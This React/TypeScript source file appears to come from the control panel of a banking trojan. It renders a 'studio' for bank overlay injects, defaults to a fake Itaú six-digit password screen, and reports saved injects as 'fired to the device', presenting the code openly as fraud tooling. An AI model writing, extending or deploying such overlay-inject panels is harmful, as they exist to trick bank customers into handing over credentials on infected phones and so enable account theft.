import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import BlackScreenEditor, { PREDEFINED_BLACK_SCREEN_TEMPLATES } from '../components/BlackScreenEditor';
import type { BlackScreenTemplate } from '../components/BlackScreenEditor';

export default function InjectsStudioPage() {
  const navigate = useNavigate();
  const defaultBankInject = PREDEFINED_BLACK_SCREEN_TEMPLATES.find((t) => t.id === 'pre-itau-senha') || PREDEFINED_BLACK_SCREEN_TEMPLATES[0];
  const [editingTemplate] = useState<BlackScreenTemplate | undefined>(defaultBankInject);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 3500);
  };

  return (
    <div className="min-h-screen bg-[#020714] text-slate-100 relative overflow-hidden font-sans">
      {/* Toast Feedback Notification */}
      {toastMessage && (
        <div className="fixed top-6 right-6 z-[999999] bg-[#071126]/95 border-2 border-cyan-400 text-cyan-100 px-5 py-3.5 rounded-2xl shadow-[0_0_35px_rgba(0,240,255,0.6)] font-mono text-xs font-black flex items-center gap-3 animate-in slide-in-from-top duration-300">
          <span className="w-3 h-3 rounded-full bg-cyan-400 animate-ping" />
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Editor Específico de Injects Bancários */}
      <BlackScreenEditor
        isOpen={true}
        onClose={() => navigate('/dashboard')}
        onSave={(template) => {
          showToast(`✨ Inject Bancário "${template.name}" salvo com sucesso nos seus injects!`);
        }}
        onApply={(template) => {
          showToast(`⚡ Inject "${template.name}" pronto e disparado para o dispositivo!`);
        }}
        initialTemplate={editingTemplate}
        editorTitle="ESTÚDIO DE INJECTS BANCÁRIOS & OVERLAYS"
        myTemplatesLabel="MEUS INJECTS SALVOS"
        defaultTemplateName="Inject Itaú - Senha 6 Dígitos"
      />
    </div>
  );
}
